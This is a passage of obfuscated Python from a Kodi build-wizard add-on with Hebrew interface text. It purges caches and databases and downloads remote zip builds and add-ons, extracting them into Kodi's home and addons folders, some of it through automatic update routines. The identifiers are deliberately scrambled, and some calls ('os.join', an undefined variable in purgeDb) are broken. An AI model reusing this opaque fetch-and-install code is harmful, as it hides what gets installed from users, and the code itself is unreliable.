		wiz .clearCache ()#line:5484
		wiz .clearPackages ('total')#line:5485
		clearThumb ('total')#line:5486
		cleanfornewbuild ()#line:5487
def cleanfornewbuild ():#line:5488
		try :#line:5489
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:5490
		except :#line:5491
			pass #line:5492
		try :#line:5493
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:5494
		except :#line:5495
			pass #line:5496
		try :#line:5497
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:5498
		except :#line:5499
			pass #line:5500
def clearThumb (type =None ):#line:5501
	OO00O0O0OOO0OOO00 =wiz .latestDB ('Textures')#line:5502
	if not type ==None :OOOO0000OOO00O0O0 =1 #line:5503
	else :OOOO0000OOO00O0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,OO00O0O0OOO0OOO00 ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:5504
	if OOOO0000OOO00O0O0 ==1 :#line:5505
		try :wiz .removeFile (os .join (DATABASE ,OO00O0O0OOO0OOO00 ))#line:5506
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (OO00O0O0OOO0OOO00 )#line:5507
		wiz .removeFolder (THUMBS )#line:5508
	else :wiz .log ('Clear thumbnames cancelled')#line:5510
	wiz .redoThumbs ()#line:5511
def purgeDb ():#line:5513
	OO000O00O0O000OO0 =[];OOOO0OO0O000O00O0 =[]#line:5514
	for O00O00OO0O00OOOOO ,OO0000OO0O0O00OO0 ,O0O0O0OO0OO00OOO0 in os .walk (HOME ):#line:5515
		for O0O0OOO0O0O0OOOOO in fnmatch .filter (O0O0O0OO0OO00OOO0 ,'*.db'):#line:5516
			if O0O0OOO0O0O0OOOOO !='Thumbs.db':#line:5517
				O0O00OO00OOOO0OO0 =os .path .join (O00O00OO0O00OOOOO ,O0O0OOO0O0O0OOOOO )#line:5518
				OO000O00O0O000OO0 .append (O0O00OO00OOOO0OO0 )#line:5519
				OOOO0000OOOO00O0O =O0O00OO00OOOO0OO0 .replace ('\\','/').split ('/')#line:5520
				OOOO0OO0O000O00O0 .append ('(%s) %s'%(OOOO0000OOOO00O0O [len (OOOO0000OOOO00O0O )-2 ],OOOO0000OOOO00O0O [len (OOOO0000OOOO00O0O )-1 ]))#line:5521
	if KODIV >=16 :#line:5522
		OOO000OO00O0OOO0O =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0OO0O000O00O0 )#line:5523
		if OOO000OO00O0OOO0O ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5524
		elif len (OOO000OO00O0OOO0O )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5525
		else :#line:5526
			for O0O00O0O0OOO0O0O0 in OOO000OO00O0OOO0O :wiz .purgeDb (OO000O00O0O000OO0 [O0O00O0O0OOO0O0O0 ])#line:5527
	else :#line:5528
		OOO000OO00O0OOO0O =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,OOOO0OO0O000O00O0 )#line:5529
		if OOO000OO00O0OOO0O ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:5530
		else :wiz .purgeDb (OO000O00O0O000OO0 [O0O00O0O0OOO0O0O0 ])#line:5531
def fastupdatefirstbuild (O0O0OO0O0OO0OO0OO ):#line:5537
	wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5539
	if ENABLE =='Yes':#line:5540
		if not NOTIFY =='true':#line:5541
			OOOO0O0O00O0O000O =wiz .workingURL (NOTIFICATION )#line:5542
			if OOOO0O0O00O0O000O ==True :#line:5543
				O0OO000000OOO0O0O ,O0O000OO0OO0O0OO0 =wiz .splitNotify (NOTIFICATION )#line:5544
				if not O0OO000000OOO0O0O ==False :#line:5546
					try :#line:5547
						O0OO000000OOO0O0O =int (O0OO000000OOO0O0O );O0O0OO0O0OO0OO0OO =int (O0O0OO0O0OO0OO0OO )#line:5548
						checkidupdate ()#line:5549
						wiz .setS ("notedismiss","true")#line:5550
						if O0OO000000OOO0O0O ==O0O0OO0O0OO0OO0OO :#line:5551
							wiz .log ("[Notifications] id[%s] Dismissed"%int (O0OO000000OOO0O0O ),xbmc .LOGNOTICE )#line:5552
						elif O0OO000000OOO0O0O >O0O0OO0O0OO0OO0OO :#line:5554
							wiz .log ("[Notifications] id: %s"%str (O0OO000000OOO0O0O ),xbmc .LOGNOTICE )#line:5555
							wiz .setS ('noteid',str (O0OO000000OOO0O0O ))#line:5556
							wiz .setS ("notedismiss","true")#line:5557
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5560
					except Exception as O0OOO0OOOO0O00O00 :#line:5561
						wiz .log ("Error on Notifications Window: %s"%str (O0OOO0OOOO0O00O00 ),xbmc .LOGERROR )#line:5562
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5564
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,OOOO0O0O00O0O000O ),xbmc .LOGNOTICE )#line:5565
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5566
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:5567
def checkUpdate ():#line:5569
	O0O0O0O0OO0OOOOOO =wiz .getS ('disableupdate')#line:5570
	O000O0OO0000OOO0O =wiz .getS ('buildname')#line:5571
	OO0OO0OO00O0O000O =wiz .getS ('buildversion')#line:5572
	O0O0O0OO000O0O0OO =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','')#line:5573
	O0O00OO0OO0O00000 =re .compile ('name="%s".+?ersion="(.+?)".+?con="(.+?)".+?anart="(.+?)"'%O000O0OO0000OOO0O ).findall (O0O0O0OO000O0O0OO )#line:5574
	if len (O0O00OO0OO0O00000 )>0 :#line:5575
		O0O0O00O00000O00O =O0O00OO0OO0O00000 [0 ][0 ]#line:5576
		OO00O0OO0O000000O =O0O00OO0OO0O00000 [0 ][1 ]#line:5577
		OO0O000O00000O0O0 =O0O00OO0OO0O00000 [0 ][2 ]#line:5578
		wiz .setS ('latestversion',O0O0O00O00000O00O )#line:5579
		if O0O0O00O00000O00O >OO0OO0OO00O0O000O :#line:5580
			if O0O0O0O0OO0OOOOOO =='false':#line:5581
				wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Opening Update Window"%(OO0OO0OO00O0O000O ,O0O0O00O00000O00O ),xbmc .LOGNOTICE )#line:5582
				notify .updateWindow (O000O0OO0000OOO0O ,OO0OO0OO00O0O000O ,O0O0O00O00000O00O ,OO00O0OO0O000000O ,OO0O000O00000O0O0 )#line:5583
			else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s] Update Window Disabled"%(OO0OO0OO00O0O000O ,O0O0O00O00000O00O ),xbmc .LOGNOTICE )#line:5584
		else :wiz .log ("[Check Updates] [Installed Version: %s] [Current Version: %s]"%(OO0OO0OO00O0O000O ,O0O0O00O00000O00O ),xbmc .LOGNOTICE )#line:5585
	else :wiz .log ("[Check Updates] ERROR: Unable to find build version in build text file",xbmc .LOGERROR )#line:5586
def updatetelemedia (OOO00O0OOOOO0O0O0 ):#line:5587
    from startup import teleupdate #line:5588
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5589
    xbmc .executebuiltin ("UpdateLocalAddons")#line:5590
    xbmc .executebuiltin ("UpdateAddonRepos")#line:5591
    wiz .wizardUpdate ('startup')#line:5592
    checkUpdate ()#line:5594
    xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:5595
    time .sleep (15.0 )#line:5596
    if ENABLE =='Yes'and BUILDNAME ==" Kodi Premium":#line:5597
     if teleupdate is False :#line:5598
        STARTP2 ()#line:5600
        wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]בודק אם קיים עדכון בשבילך[/COLOR]'%COLOR2 )#line:5601
        if not NOTIFY =='true':#line:5602
            O0OO000OO000OO0O0 =wiz .workingURL (NOTIFICATION )#line:5603
            if O0OO000OO000OO0O0 ==True :#line:5604
                OOO000OO00000OO00 ,OO0O00OOO0O0OO00O =wiz .splitNotify (NOTIFICATION )#line:5605
                if not OOO000OO00000OO00 ==False :#line:5606
                    try :#line:5607
                        OOO000OO00000OO00 =int (OOO000OO00000OO00 );OOO00O0OOOOO0O0O0 =int (OOO00O0OOOOO0O0O0 )#line:5608
                        if OOO000OO00000OO00 ==OOO00O0OOOOO0O0O0 :#line:5609
                            if NOTEDISMISS =='false':#line:5610
                                debridit .debridIt ('update','all')#line:5611
                                traktit .traktIt ('update','all')#line:5612
                                checkidupdatetele ()#line:5613
                            else :wiz .log ("[Notifications] id[%s] Dismissed"%int (OOO000OO00000OO00 ),xbmc .LOGNOTICE )#line:5614
                        elif OOO000OO00000OO00 >OOO00O0OOOOO0O0O0 :#line:5615
                            wiz .log ("[Notifications] id: %s"%str (OOO000OO00000OO00 ),xbmc .LOGNOTICE )#line:5616
                            wiz .setS ('noteid',str (OOO000OO00000OO00 ))#line:5617
                            wiz .setS ('notedismiss','false')#line:5618
                            debridit .debridIt ('update','all')#line:5620
                            traktit .traktIt ('update','all')#line:5621
                            checkidupdatetele ()#line:5622
                            wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:5624
                    except Exception as O00OO00OO0O0O0OO0 :#line:5625
                        wiz .log ("Error on Notifications Window: %s"%str (O00OO00OO0O0O0OO0 ),xbmc .LOGERROR )#line:5626
                else :wiz .log ("[Notifications] Text File not formated Correctly")#line:5627
            else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0OO000OO000OO0O0 ),xbmc .LOGNOTICE )#line:5628
        else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:5629
def checkidupdate ():#line:5633
				wiz .setS ("notedismiss","true")#line:5635
				OOO0O0O0O00OO0O00 =wiz .workingURL (NOTIFICATION )#line:5636
				OO0OO0O0O00O0OO0O =" Kodi Premium"#line:5638
				O0OOO000OOO00OO0O =wiz .checkBuild (OO0OO0O0O00O0OO0O ,'gui')#line:5639
				O0OO00OO0OOOOOOOO =OO0OO0O0O00O0OO0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5640
				if not wiz .workingURL (O0OOO000OOO00OO0O )==True :return #line:5641
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5642
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,OO0OO0O0O00O0OO0O ),'','אנא המתן')#line:5643
				OOOOO0OOO00O0O0OO =os .path .join (PACKAGES ,'%s_guisettings.zip'%O0OO00OO0OOOOOOOO )#line:5644
				try :os .remove (OOOOO0OOO00O0O0OO )#line:5645
				except :pass #line:5646
				logging .warning (O0OOO000OOO00OO0O )#line:5647
				if 'google'in O0OOO000OOO00OO0O :#line:5648
				   OO000OO00O00OOOOO =googledrive_download (O0OOO000OOO00OO0O ,OOOOO0OOO00O0O0OO ,DP ,wiz .checkBuild (OO0OO0O0O00O0OO0O ,'filesize'))#line:5649
				else :#line:5652
				  downloader .download (O0OOO000OOO00OO0O ,OOOOO0OOO00O0O0OO ,DP )#line:5653
				xbmc .sleep (100 )#line:5654
				OOO0OOO0OO00O00O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0OO0O0O00O0OO0O )#line:5655
				DP .update (0 ,OOO0OOO0OO00O00O0 ,'','אנא המתן')#line:5656
				extract .all (OOOOO0OOO00O0O0OO ,HOME ,DP ,title =OOO0OOO0OO00O00O0 )#line:5657
				DP .close ()#line:5658
				wiz .defaultSkin ()#line:5659
				wiz .lookandFeelData ('save')#line:5660
				if KODIV >=18 :#line:5661
					skindialogsettind18 ()#line:5662
				if INSTALLMETHOD ==1 :OO0OOO0OOOO000O00 =1 #line:5665
				elif INSTALLMETHOD ==2 :OO0OOO0OOOO000O00 =0 #line:5666
				else :DP .close ()#line:5667
def checkidupdatetele ():#line:5668
				wiz .setS ("notedismiss","true")#line:5670
				OOO0OOOOO0OOO00O0 =wiz .workingURL (NOTIFICATION )#line:5671
				OOOOOO0OOO0OOO000 =" Kodi Premium"#line:5673
				OO0O00O000O000O00 =wiz .checkBuild (OOOOOO0OOO0OOO000 ,'gui')#line:5674
				O000OOOO0OO0O0000 =OOOOOO0OOO0OOO000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:5675
				if not wiz .workingURL (OO0O00O000O000O00 )==True :return #line:5676
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:5677
				OO0OO0O0OOOOO0O00 =os .path .join (PACKAGES ,'%s_guisettings.zip'%O000OOOO0OO0O0000 )#line:5680
				try :os .remove (OO0OO0O0OOOOO0O00 )#line:5681
				except :pass #line:5682
				if 'google'in OO0O00O000O000O00 :#line:5684
				   O00O0OO0000OOOOOO =googledrive_download (OO0O00O000O000O00 ,OO0OO0O0OOOOO0O00 ,DP2 ,wiz .checkBuild (OOOOOO0OOO0OOO000 ,'filesize'))#line:5685
				else :#line:5688
				  downloaderbg .download3 (OO0O00O000O000O00 ,OO0OO0O0OOOOO0O00 ,DP2 )#line:5689
				xbmc .sleep (100 )#line:5690
				DP2 .create ('[B][COLOR=green]מתקין                         [/COLOR][/B]')#line:5691
				DP2 .update (100 ,message ='[B][COLOR=yellow]אנא המתן ...                    [/COLOR][/B]')#line:5693
				extract .all2 (OO0OO0O0OOOOO0O00 ,HOME ,DP2 )#line:5695
				DP2 .close ()#line:5696
				wiz .defaultSkin ()#line:5697
				wiz .lookandFeelData ('save')#line:5698
				wiz .kodi17Fix ()#line:5699
				if KODIV >=18 :#line:5700
					skindialogsettind18 ()#line:5701
				debridit .debridIt ('restore','all')#line:5706
				traktit .traktIt ('restore','all')#line:5707
				if INSTALLMETHOD ==1 :OO0O0O0OO0OO000O0 =1 #line:5708
				elif INSTALLMETHOD ==2 :OO0O0O0OO0OO000O0 =0 #line:5709
				else :DP2 .close ()#line:5710
				O000000OOOO0O0OO0 =(NOTIFICATION2 )#line:5711
				O00O0000OO00OO000 =urllib2 .urlopen (O000000OOOO0O0OO0 )#line:5712
				OOO0OOO0O00OO000O =O00O0000OO00OO000 .readlines ()#line:5713
				O000O000O0O0000OO =0 #line:5714
				for O0O00O0OOOOO00O00 in OOO0OOO0O00OO000O :#line:5717
					if O0O00O0OOOOO00O00 .split (' ==')[0 ]=="noreset"or O0O00O0OOOOO00O00 .split ()[0 ]=="noreset":#line:5718
						xbmc .executebuiltin ("ReloadSkin()")#line:5720
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:5721
						OO0OO0O00O00OOO00 =(ADDON .getSetting ("message"))#line:5722
						if OO0OO0O00O00OOO00 =='true':#line:5723
							infobuild ()#line:5724
						update_Votes ()#line:5725
						indicatorfastupdate ()#line:5726
					if O0O00O0OOOOO00O00 .split (' ==')[0 ]=="reset"or O0O00O0OOOOO00O00 .split ()[0 ]=="reset":#line:5727
						update_Votes ()#line:5729
						indicatorfastupdate ()#line:5730
						resetkodi ()#line:5731
def gaiaserenaddon ():#line:5732
  O0O00O000OOO0O000 =(ADDON .getSetting ("gaiaseren"))#line:5733
  O0000O0O0OOOO0OOO =(ADDON .getSetting ("auto_rd"))#line:5734
  if O0O00O000OOO0O000 =='true'and O0000O0O0OOOO0OOO =='true':#line:5735
    OOO0000OO0OOO0OOO =(NEWFASTUPDATE )#line:5736
    O0O0O000OOOOO0000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5737
    O000OO00OO000O0O0 =xbmcgui .DialogProgress ()#line:5738
    O000OO00OO000O0O0 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5739
    OOOOOO00OOO000OOO =os .path .join (PACKAGES ,'isr.zip')#line:5740
    OOO000000000000OO =urllib2 .Request (OOO0000OO0OOO0OOO )#line:5741
    OOOOOO000OOO00000 =urllib2 .urlopen (OOO000000000000OO )#line:5742
    O00OOOOOOO00OO0OO =xbmcgui .DialogProgress ()#line:5744
    O00OOOOOOO00OO0OO .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5745
    O00OOOOOOO00OO0OO .update (0 )#line:5746
    O0OO0OO0OO0OOOO0O =open (OOOOOO00OOO000OOO ,'wb')#line:5748
    try :#line:5750
      O000OOO0O00OOOOO0 =OOOOOO000OOO00000 .info ().getheader ('Content-Length').strip ()#line:5751
      O0OO000OOOO0OO000 =True #line:5752
    except AttributeError :#line:5753
          O0OO000OOOO0OO000 =False #line:5754
    if O0OO000OOOO0OO000 :#line:5756
          O000OOO0O00OOOOO0 =int (O000OOO0O00OOOOO0 )#line:5757
    O00OOOOOOOO000000 =0 #line:5759
    O000O00O0O0OO0OOO =time .time ()#line:5760
    while True :#line:5761
          OO00OO0O00OOOOO00 =OOOOOO000OOO00000 .read (8192 )#line:5762
          if not OO00OO0O00OOOOO00 :#line:5763
              sys .stdout .write ('\n')#line:5764
              break #line:5765
          O00OOOOOOOO000000 +=len (OO00OO0O00OOOOO00 )#line:5767
          O0OO0OO0OO0OOOO0O .write (OO00OO0O00OOOOO00 )#line:5768
          if not O0OO000OOOO0OO000 :#line:5770
              O000OOO0O00OOOOO0 =O00OOOOOOOO000000 #line:5771
          if O00OOOOOOO00OO0OO .iscanceled ():#line:5772
             O00OOOOOOO00OO0OO .close ()#line:5773
             try :#line:5774
              os .remove (OOOOOO00OOO000OOO )#line:5775
             except :#line:5776
              pass #line:5777
             break #line:5778
          O00O0OO000000O000 =float (O00OOOOOOOO000000 )/O000OOO0O00OOOOO0 #line:5779
          O00O0OO000000O000 =round (O00O0OO000000O000 *100 ,2 )#line:5780
          O00000000OOOOO0OO =O00OOOOOOOO000000 /(1024 *1024 )#line:5781
          O0OOO000O00O00O0O =O000OOO0O00OOOOO0 /(1024 *1024 )#line:5782
          OO0O00OOOO00OO000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O00000000OOOOO0OO ,'teal',O0OOO000O00O00O0O )#line:5783
          if (time .time ()-O000O00O0O0OO0OOO )>0 :#line:5784
            OOOO00000O0O00OOO =O00OOOOOOOO000000 /(time .time ()-O000O00O0O0OO0OOO )#line:5785
            OOOO00000O0O00OOO =OOOO00000O0O00OOO /1024 #line:5786
          else :#line:5787
           OOOO00000O0O00OOO =0 #line:5788
          OOO00O000OOO0OO0O ='KB'#line:5789
          if OOOO00000O0O00OOO >=1024 :#line:5790
             OOOO00000O0O00OOO =OOOO00000O0O00OOO /1024 #line:5791
             OOO00O000OOO0OO0O ='MB'#line:5792
          if OOOO00000O0O00OOO >0 and not O00O0OO000000O000 ==100 :#line:5793
              OOOOO00O00OOO000O =(O000OOO0O00OOOOO0 -O00OOOOOOOO000000 )/OOOO00000O0O00OOO #line:5794
          else :#line:5795
              OOOOO00O00OOO000O =0 #line:5796
          O00OO00OO000O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOOO00000O0O00OOO ,OOO00O000OOO0OO0O )#line:5797
          O00OOOOOOO00OO0OO .update (int (O00O0OO000000O000 ),OO0O00OOOO00OO000 ,O00OO00OO000O0O0O +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5799
    O000OOO0O0O00OO00 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5802
    O0OO0OO0OO0OOOO0O .close ()#line:5805
    extract .all (OOOOOO00OOO000OOO ,O000OOO0O0O00OO00 ,O00OOOOOOO00OO0OO )#line:5806
    try :#line:5810
      os .remove (OOOOOO00OOO000OOO )#line:5811
    except :#line:5812
      pass #line:5813
def iptvsimpldownpc ():#line:5814
    O0000OOO00O000O00 =(IPTVSIMPL18PC )#line:5816
    OOO0O0OO0OOO0O000 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5817
    OOO0O0OO00O0OOOO0 =xbmcgui .DialogProgress ()#line:5818
    OOO0O0OO00O0OOOO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:5819
    O00O00OO0OOOOOOOO =os .path .join (PACKAGES ,'isr.zip')#line:5820
    O0O00OOOO0O0OOO0O =urllib2 .Request (O0000OOO00O000O00 )#line:5821
    OO0000OO00O00O000 =urllib2 .urlopen (O0O00OOOO0O0OOO0O )#line:5822
    OO0OO0O00OO000OO0 =xbmcgui .DialogProgress ()#line:5824
    OO0OO0O00OO000OO0 .create ("[B][COLOR=green]מוריד לוקח טלוויזיה חיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:5825
    OO0OO0O00OO000OO0 .update (0 )#line:5826
    OO0OO00OO0OO0OOO0 =open (O00O00OO0OOOOOOOO ,'wb')#line:5828
    try :#line:5830
      O00000O0OO0O00O0O =OO0000OO00O00O000 .info ().getheader ('Content-Length').strip ()#line:5831
      O0O00000OOO0O0O00 =True #line:5832
    except AttributeError :#line:5833
          O0O00000OOO0O0O00 =False #line:5834
    if O0O00000OOO0O0O00 :#line:5836
          O00000O0OO0O00O0O =int (O00000O0OO0O00O0O )#line:5837
    OO00O0OOOOOOO00OO =0 #line:5839
    OO00O000OO0O000O0 =time .time ()#line:5840
    while True :#line:5841
          OOO0O0OOOOOOO0O00 =OO0000OO00O00O000 .read (8192 )#line:5842
          if not OOO0O0OOOOOOO0O00 :#line:5843
              sys .stdout .write ('\n')#line:5844
              break #line:5845
          OO00O0OOOOOOO00OO +=len (OOO0O0OOOOOOO0O00 )#line:5847
          OO0OO00OO0OO0OOO0 .write (OOO0O0OOOOOOO0O00 )#line:5848
          if not O0O00000OOO0O0O00 :#line:5850
              O00000O0OO0O00O0O =OO00O0OOOOOOO00OO #line:5851
          if OO0OO0O00OO000OO0 .iscanceled ():#line:5852
             OO0OO0O00OO000OO0 .close ()#line:5853
             try :#line:5854
              os .remove (O00O00OO0OOOOOOOO )#line:5855
             except :#line:5856
              pass #line:5857
             break #line:5858
          O0OO00O000OOOOO0O =float (OO00O0OOOOOOO00OO )/O00000O0OO0O00O0O #line:5859
          O0OO00O000OOOOO0O =round (O0OO00O000OOOOO0O *100 ,2 )#line:5860
          O0OOOOOO00OOO00O0 =OO00O0OOOOOOO00OO /(1024 *1024 )#line:5861
          O0O00OOOOO0000O00 =O00000O0OO0O00O0O /(1024 *1024 )#line:5862
          OOO0OO0OOO000OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0OOOOOO00OOO00O0 ,'teal',O0O00OOOOO0000O00 )#line:5863
          if (time .time ()-OO00O000OO0O000O0 )>0 :#line:5864
            O0OOO00O0OOO0O00O =OO00O0OOOOOOO00OO /(time .time ()-OO00O000OO0O000O0 )#line:5865
            O0OOO00O0OOO0O00O =O0OOO00O0OOO0O00O /1024 #line:5866
          else :#line:5867
           O0OOO00O0OOO0O00O =0 #line:5868
          O0O0000O000000OO0 ='KB'#line:5869
          if O0OOO00O0OOO0O00O >=1024 :#line:5870
             O0OOO00O0OOO0O00O =O0OOO00O0OOO0O00O /1024 #line:5871
             O0O0000O000000OO0 ='MB'#line:5872
          if O0OOO00O0OOO0O00O >0 and not O0OO00O000OOOOO0O ==100 :#line:5873
              O00O00O00OOOOO0O0 =(O00000O0OO0O00O0O -OO00O0OOOOOOO00OO )/O0OOO00O0OOO0O00O #line:5874
          else :#line:5875
              O00O00O00OOOOO0O0 =0 #line:5876
          O0O0O00000OOOO0OO ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OOO00O0OOO0O00O ,O0O0000O000000OO0 )#line:5877
          OO0OO0O00OO000OO0 .update (int (O0OO00O000OOOOO0O ),OOO0OO0OOO000OOOO ,O0O0O00000OOOO0OO +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:5879
    OOO0O00OO000O00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:5882
    OO0OO00OO0OO0OOO0 .close ()#line:5885
    extract .all (O00O00OO0OOOOOOOO ,OOO0O00OO000O00O0 ,OO0OO0O00OO000OO0 )#line:5886
    try :#line:5890
      os .remove (O00O00OO0OOOOOOOO )#line:5891
    except :#line:5892
      pass #line:5893
def iptvkodi18idan ():#line:5894
      if xbmc .getCondVisibility ('system.platform.windows')and KODIV >=18 :#line:5896
              O00O000O0000O0O0O ='https://github.com/vip200/victory/blob/master/pvr.iptvsimple18win.zip?raw=true'#line:5899
              O00O0OOO0OO0OOO00 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:5900
              O0OO0O0O0O0O0O0O0 =xbmcgui .DialogProgress ()#line:5901
              O0OO0O0O0O0O0O0O0 .create ("XBMC ISRAEL","Downloading "+'הגדרת ערוצי עידן פלוס','','Please Wait')#line:5902
              O0OOO00O0O000OO00 =os .path .join (O00O0OOO0OO0OOO00 ,'isr.zip')#line:5903
              OOO0OO00O00OO0000 =urllib2 .Request (O00O000O0000O0O0O )#line:5904
              OOOO0OO0O0OO00OOO =urllib2 .urlopen (OOO0OO00O00OO0000 )#line:5905
              O000OOO0O00000O00 =xbmcgui .DialogProgress ()#line:5907
              O000OOO0O00000O00 .create ("Downloading","Downloading "+'הגדרת ערוצי עידן פלוס')#line:5908
              O000OOO0O00000O00 .update (0 )#line:5909
              O0000OOOO0O00OO0O =open (O0OOO00O0O000OO00 ,'wb')#line:5911
              try :#line:5913
                OO0O0OO0O0OOOOO0O =OOOO0OO0O0OO00OOO .info ().getheader ('Content-Length').strip ()#line:5914
                O0000O0O0OOOO0000 =True #line:5915
              except AttributeError :#line:5916
                    O0000O0O0OOOO0000 =False #line:5917
              if O0000O0O0OOOO0000 :#line:5919
                    OO0O0OO0O0OOOOO0O =int (OO0O0OO0O0OOOOO0O )#line:5920
              OOOO00OO0000OO0O0 =0 #line:5922
              O0O000OOOO00O0O0O =time .time ()#line:5923
              while True :#line:5924
                    O0O0000000O00OO0O =OOOO0OO0O0OO00OOO .read (8192 )#line:5925
                    if not O0O0000000O00OO0O :#line:5926
                        sys .stdout .write ('\n')#line:5927
                        break #line:5928
                    OOOO00OO0000OO0O0 +=len (O0O0000000O00OO0O )#line:5930
                    O0000OOOO0O00OO0O .write (O0O0000000O00OO0O )#line:5931
                    if not O0000O0O0OOOO0000 :#line:5933
                        OO0O0OO0O0OOOOO0O =OOOO00OO0000OO0O0 #line:5934
                    if O000OOO0O00000O00 .iscanceled ():#line:5935
                       O000OOO0O00000O00 .close ()#line:5936
                       try :#line:5937
                        os .remove (O0OOO00O0O000OO00 )#line:5938
                       except :#line:5939
                        pass #line:5940
                       break #line:5941
                    O00OOOOOO0O0OO0O0 =float (OOOO00OO0000OO0O0 )/OO0O0OO0O0OOOOO0O #line:5942
                    O00OOOOOO0O0OO0O0 =round (O00OOOOOO0O0OO0O0 *100 ,2 )#line:5943
                    O0000OO0OO000OO00 =OOOO00OO0000OO0O0 /(1024 *1024 )#line:5944
                    O0OO0000OO0000000 =OO0O0OO0O0OOOOO0O /(1024 *1024 )#line:5945
                    OO00O00O0O000000O ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O0000OO0OO000OO00 ,'teal',O0OO0000OO0000000 )#line:5946
                    if (time .time ()-O0O000OOOO00O0O0O )>0 :#line:5947
                      OOOO00OOOO0OO0OO0 =OOOO00OO0000OO0O0 /(time .time ()-O0O000OOOO00O0O0O )#line:5948
                      OOOO00OOOO0OO0OO0 =OOOO00OOOO0OO0OO0 /1024 #line:5949
                    else :#line:5950
                     OOOO00OOOO0OO0OO0 =0 #line:5951
                    OOO00OO0OO00O0O0O ='KB'#line:5952
                    if OOOO00OOOO0OO0OO0 >=1024 :#line:5953
                       OOOO00OOOO0OO0OO0 =OOOO00OOOO0OO0OO0 /1024 #line:5954
                       OOO00OO0OO00O0O0O ='MB'#line:5955
                    if OOOO00OOOO0OO0OO0 >0 and not O00OOOOOO0O0OO0O0 ==100 :#line:5956
